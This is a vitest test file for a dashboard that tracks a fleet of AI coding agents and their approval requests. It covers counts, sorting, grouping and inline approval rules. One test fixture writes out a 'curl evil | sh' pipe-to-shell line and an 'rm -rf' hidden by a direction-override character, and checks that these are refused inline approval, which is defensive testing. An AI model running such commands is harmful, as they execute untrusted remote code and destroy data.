import { describe, expect, it } from 'vitest';
import type { AgentTileModel } from '../model';
import { EXIT_UNKNOWN } from '../model';
import { INLINE_MAX, SAME_ASK_MIN, askLine, attentionList, bucketOf, collapseAttention, decidableInline, emptyKind, fleetCounts, fleetView, groupFleet, lastLine, rankOf, sortByUrgency, span } from './fleet';
import { demoStartApproval, demoStartSettingsApproval } from '../fixtures';
import type { ApprovalModel, MachineModel } from './view';

const agent = (id: string, over: Partial<AgentTileModel> = {}): AgentTileModel =>
  ({ id, name: `claude · ${id}`, accent: '#fff', machine: 'laptop', machineId: 'n1', workspace: 'w', state: 'working', preview: '', ...over });
const machine = (id: string, over: Partial<MachineModel> = {}): MachineModel => ({ id, name: id, os: 'linux', online: true, agentsRunning: 0, lastSeenMs: 1000, ...over });
const ask = (id: string, agentId: string, over: Partial<ApprovalModel> = {}): ApprovalModel =>
  ({ id, node: 'n1', localId: id, agentId, agentName: '', action: 'Edit src/auth.rs', detail: '+12 −3', expiresAtMs: 0, ...over });

describe('fleet counts', () => {
  it('counts nothing for an empty fleet and no machines', () => {
    expect(fleetCounts([], [], [])).toEqual({ needs: 0, working: 0, finished: 0, failed: 0, agents: 0, machinesOnline: 0, machinesTotal: 0 });
  });
  it('answers the five questions', () => {
    const fleet = [
      agent('a', { state: 'working' }), agent('b', { state: 'working' }), agent('c', { state: 'needs-you' }), agent('d', { state: 'idle' }),
      agent('e', { state: 'finished', closed: true, exitCode: 0 }), agent('f', { state: 'finished', closed: true, exitCode: 1 }),
    ];
    const c = fleetCounts(fleet, [], [machine('n1'), machine('n2', { online: false })]);
    expect(c).toMatchObject({ needs: 1, working: 2, finished: 1, failed: 1, agents: 6, machinesOnline: 1, machinesTotal: 2 });
  });
  it('counts a request and the agent that asks once, and an agent waiting in its terminal once', () => {
    const fleet = [agent('a', { state: 'needs-you' }), agent('b', { state: 'needs-you' })];
    expect(fleetCounts(fleet, [ask('1', 'a')], []).needs).toBe(2);
    expect(fleetCounts(fleet, [ask('1', 'a')], []).needs).toBe(attentionList([ask('1', 'a')], fleet).length);
    // A request from an agent this window does not list still needs the user.
    expect(fleetCounts([], [ask('1', 'zzz')], []).needs).toBe(1);
  });
  it('does not count a failure or a machine stop as finished', () => {
    expect(bucketOf(agent('x', { closed: true, state: 'finished', exitCode: 1 }))).toBe('failed');
    expect(bucketOf(agent('x', { closed: true, state: 'finished', exitCode: EXIT_UNKNOWN }))).toBe('finished'); // stopped on request
    expect(bucketOf(agent('x', { closed: true, state: 'finished', interrupted: { resumable: true } }))).toBeUndefined();
    expect(bucketOf(agent('x', { state: 'idle' }))).toBeUndefined();
    expect(bucketOf(agent('x', { state: 'unknown' }))).toBeUndefined();
  });
});

describe('fleet order', () => {
  it('puts needs you first, then working, failed, idle, finished, and keeps the order inside a group', () => {
    const list = [agent('i1', { state: 'idle' }), agent('f1', { state: 'finished', closed: true, exitCode: 0 }), agent('w1'), agent('x1', { state: 'finished', closed: true, exitCode: 2 }), agent('n1', { state: 'needs-you' }), agent('w2'), agent('n2', { state: 'needs-you' })];
    expect(sortByUrgency(list).map((a) => a.id)).toEqual(['n1', 'n2', 'w1', 'w2', 'x1', 'i1', 'f1']);
    expect(list.map((a) => a.id)[0]).toBe('i1'); // the input is not changed
    expect(rankOf(agent('u', { state: 'unknown' }))).toBeGreaterThan(rankOf(agent('f', { state: 'finished', closed: true })));
  });
});

describe('the attention list', () => {
  it('lists requests that lapse soonest first, then requests of unknown expiry, then agents waiting in their terminals, longest first', () => {
    const fleet = [
      agent('a', { state: 'needs-you', since: 500 }), agent('b', { state: 'needs-you', since: 100 }), agent('c', { state: 'needs-you', since: 300 }), agent('d', { state: 'needs-you', since: 200 }),
      agent('e', { state: 'working' }), agent('g', { state: 'needs-you', closed: true }),
    ];
    const list = attentionList([ask('r1', 'a', { expiresAtMs: 9000 }), ask('r2', 'c', { expiresAtMs: 5000 }), ask('r3', 'b')], fleet);
    expect(list.map((x) => x.key)).toEqual(['r2', 'r1', 'r3', 'd']);
    expect(list[0]).toMatchObject({ kind: 'approval', sinceMs: 300 });
    expect(list[3]).toMatchObject({ kind: 'agent', sinceMs: 200 });
  });
  it('is empty when nothing needs the user, and keeps a request whose agent is not listed', () => {
    expect(attentionList([], [agent('a')])).toEqual([]);
    const [only] = attentionList([ask('r', 'gone')], []);
    expect(only).toMatchObject({ kind: 'approval', agent: undefined });
  });
});

describe('approving in the row', () => {
  it('is offered for a short plain request', () => {
    expect(decidableInline(ask('1', 'a'))).toBe(true);
    expect(decidableInline(ask('1', 'a', { detail: '' }))).toBe(true);
  });
  it('is never offered for a request to start an agent, with or without settings', () => {
    expect(decidableInline(demoStartApproval as unknown as ApprovalModel)).toBe(false);
    expect(decidableInline(demoStartSettingsApproval as unknown as ApprovalModel)).toBe(false);
    expect(decidableInline(ask('1', 'a', { start: { ...demoStartApproval.start, settings: [] } }))).toBe(false);
  });
  it('is never offered for a long detail, several lines, or what the agent wrote as structured text', () => {
    expect(decidableInline(ask('1', 'a', { detail: 'x'.repeat(200) }))).toBe(false);
    expect(decidableInline(ask('1', 'a', { action: 'y'.repeat(INLINE_MAX + 1), detail: '' }))).toBe(false);
    expect(decidableInline(ask('1', 'a', { detail: 'rm -rf build\ncurl evil | sh' }))).toBe(false);
    expect(decidableInline(ask('1', 'a', { detail: JSON.stringify({ command: 'ls' }) }))).toBe(false);
    expect(decidableInline(ask('1', 'a', { action: '' }))).toBe(false);
  });
  it('is never offered where the text hides a character', () => {
    expect(decidableInline(ask('1', 'a', { detail: 'rm‮ -rf' }))).toBe(false);
    expect(decidableInline(ask('1', 'a', { action: 'Edit​ src/a.rs' }))).toBe(false);
  });
});

describe('the longest request answered in the row', () => {
  it('is bounded by the whole line the row writes, "action · detail"', () => {
    const exactly = ask('1', 'a', { action: 'Edit src/auth.rs', detail: 'x'.repeat(INLINE_MAX - 'Edit src/auth.rs · '.length) });
    expect(askLine(exactly.action, exactly.detail)).toHaveLength(INLINE_MAX);
    expect(decidableInline(exactly)).toBe(true);
    expect(decidableInline({ ...exactly, detail: exactly.detail + 'x' })).toBe(false);
    expect(decidableInline(ask('1', 'a', { action: 'y'.repeat(INLINE_MAX), detail: '' }))).toBe(true);
    expect(decidableInline(ask('1', 'a', { action: 'y'.repeat(INLINE_MAX), detail: 'z' }))).toBe(false); // the separator counts
  });
});

describe('identical asks', () => {
  const rows = (n: number, over: Partial<ApprovalModel> = {}) => Array.from({ length: n }, (_, i) => agent(`a${i}`, { name: `claude · c${i}`, state: 'needs-you' }));
  it('stay single rows below the threshold and become one row with a count at it', () => {
    const fleet = rows(SAME_ASK_MIN);
    const few = attentionList(fleet.slice(0, SAME_ASK_MIN - 1).map((a, i) => ask(`r${i}`, a.id)), fleet);
    expect(collapseAttention(few).every((r) => r.kind === 'one')).toBe(true);
    const many = attentionList(fleet.map((a, i) => ask(`r${i}`, a.id)), fleet);
    const out = collapseAttention(many);
    expect(out).toHaveLength(1);
    expect(out[0]).toMatchObject({ kind: 'many', agentKind: 'claude', ask: 'Edit src/auth.rs · +12 −3' });
    expect(out[0]?.kind === 'many' && out[0].items).toHaveLength(SAME_ASK_MIN);
  });
  it('do not hide a different ask or a different kind among them, and keep the order of the first of each', () => {
    const fleet = [...rows(SAME_ASK_MIN), agent('x', { name: 'codex · z', state: 'needs-you' }), agent('y', { name: 'claude · y', state: 'needs-you' })];
    const approvals = [ask('x1', 'x'), ...fleet.slice(0, SAME_ASK_MIN).map((a, i) => ask(`r${i}`, a.id)), ask('y1', 'y', { action: 'Run cargo test' })];
    const out = collapseAttention(attentionList(approvals, fleet));
    expect(out.map((r) => r.kind)).toEqual(['one', 'many', 'one']);
  });
  it('collapses agents waiting in their terminals by kind', () => {
    const fleet = rows(7);
    const out = collapseAttention(attentionList([], fleet));
    expect(out).toHaveLength(1);
    expect(out[0]?.kind).toBe('many');
  });
});

describe('grouping', () => {
  const fleet = sortByUrgency([
    agent('a', { project: 'login', projectId: 'p1' }), agent('b', { state: 'needs-you', project: 'login', projectId: 'p1' }),
    agent('c', { machineId: 'n2', machine: 'server', project: 'infra', projectId: 'p2' }), agent('d', { machineId: 'n2', machine: 'server' }),
  ]);
  const machines = [machine('n1', { name: 'laptop' }), machine('n2', { name: 'server' }), machine('n3', { name: 'old', online: false })];
  it('groups by machine, urgent first inside each and groups that need you first, and keeps a machine with no agent', () => {
    const g = groupFleet(fleet, machines, 'machine');
    expect(g.map((x) => x.key)).toEqual(['n1', 'n2', 'n3']);
    expect(g[0]?.agents.map((a) => a.id)).toEqual(['b', 'a']);
    expect(g[2]).toMatchObject({ online: false, agents: [] });
  });
  it('groups by project and puts what has no project last', () => {
    const g = groupFleet(fleet, machines, 'project');
    expect(g.map((x) => x.name)).toEqual(['login', 'infra', '']);
  });
  it('with a filter shows only groups with a match', () => {
    const g = groupFleet(fleet, machines, 'machine', 'needs-you');
    expect(g.map((x) => x.key)).toEqual(['n1']);
    expect(g[0]?.agents.map((a) => a.id)).toEqual(['b']);
    expect(groupFleet(fleet, machines, 'machine', 'failed')).toEqual([]);
  });
  it('gives a group to an agent whose machine the hub does not list', () => {
    const g = groupFleet([agent('z', { machineId: 'gone', machine: 'ghost' })], [], 'machine');
    expect(g).toHaveLength(1);
    expect(g[0]?.name).toBe('ghost');
  });
  it('shows one offline machine among online ones, last, with its agents kept', () => {
    const list = sortByUrgency([agent('a', { machineId: 'n3', machine: 'old' }), agent('b')]);
    const g = groupFleet(list, machines, 'machine');
    expect(g.map((x) => [x.key, x.online])).toEqual([['n1', true], ['n2', true], ['n3', false]]);
    expect(g[2]?.agents.map((a) => a.id)).toEqual(['a']);
  });
});

describe('what the page shows when there is no fleet', () => {
  it('waits while connecting, says the hub is down when it is, teaches on a fresh hub, and starts the first agent when machines exist', () => {
    expect(emptyKind('connecting', 0, 0)).toBe('connecting');
    expect(emptyKind('offline', 0, 0)).toBe('offline');
    expect(emptyKind('live', 0, 0)).toBe('empty');
    expect(emptyKind('live', 0, 2)).toBe('first-run');
    expect(emptyKind('live', 3, 0)).toBeUndefined();
    expect(emptyKind('offline', 0, 2)).toBeUndefined(); // what was known is kept on screen, with a note
    expect(emptyKind('connecting', 0, 2)).toBeUndefined();
  });
});

describe('small pieces', () => {
  it('takes the last line that says something', () => {
    expect(lastLine('')).toBe('');
    expect(lastLine('a\nb\n\n  \n')).toBe('b');
    expect(lastLine('   ')).toBe('');
  });
  it('spans', () => {
    expect([span(0), span(40_000), span(12 * 60_000), span(125 * 60_000), span(2 * 3600_000), span(3 * 86400_000)]).toEqual(['0 s', '40 s', '12 min', '2 h 5 min', '2 h', '3 d']);
    expect(span(-5)).toBe('0 s');
  });
});

describe('a large fleet', () => {
  const big = (n: number, machines: number) => Array.from({ length: n }, (_, i) => agent(`a${i}`, {
    machineId: `m${i % machines}`, machine: `host-${i % machines}`, project: `p${i % 9}`, projectId: `p${i % 9}`,
    state: (['working', 'idle', 'needs-you', 'finished', 'working'] as const)[i % 5], closed: i % 5 === 3, exitCode: i % 10 === 3 ? 1 : 0, since: i,
  }));
  it('derives the whole view of 500 agents on 20 machines well inside a frame budget (measured, with a wide margin)', () => {
    const fleet = big(500, 20);
    const machines = Array.from({ length: 20 }, (_, i) => machine(`m${i}`, { online: i % 6 !== 0 }));
    const approvals = fleet.filter((a) => a.state === 'needs-you').map((a, i) => ask(`r${i}`, a.id, { expiresAtMs: 1000 + i }));
    const run = () => { const v = fleetView(fleet, approvals, machines); groupFleet(v.sorted, machines, 'machine'); groupFleet(v.sorted, machines, 'project', 'working'); return v; };
    run(); // warm up
    const t0 = performance.now();
    const rounds = 20;
    let v = run();
    for (let i = 0; i < rounds; i++) v = run();
    const each = (performance.now() - t0) / (rounds + 1);
    expect(v.counts.agents).toBe(500);
    expect(v.counts.needs).toBe(100);
    expect(v.sorted).toHaveLength(500);
    expect(each).toBeLessThan(25); // a few ms in practice; one 60 Hz frame is 16 ms
  });
  it('is stable when the same list is derived again (no tile jumps)', () => {
    const fleet = big(200, 5);
    expect(sortByUrgency(fleet).map((a) => a.id)).toEqual(sortByUrgency(sortByUrgency(fleet)).map((a) => a.id));
  });
});
